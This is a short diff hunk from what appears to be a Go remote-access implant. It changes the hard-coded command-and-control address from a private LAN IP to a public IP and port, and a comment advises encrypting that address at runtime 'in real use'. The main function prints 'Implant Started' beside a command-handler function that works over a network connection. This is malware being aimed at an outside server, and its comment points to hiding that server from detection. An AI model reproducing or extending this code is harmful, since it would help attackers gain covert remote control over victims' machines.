@@ -274,7 +274,7 @@ func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.102:8989" // Encrypt/decode at runtime in real use
+	c2Address := "89.43.33.169:6969" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
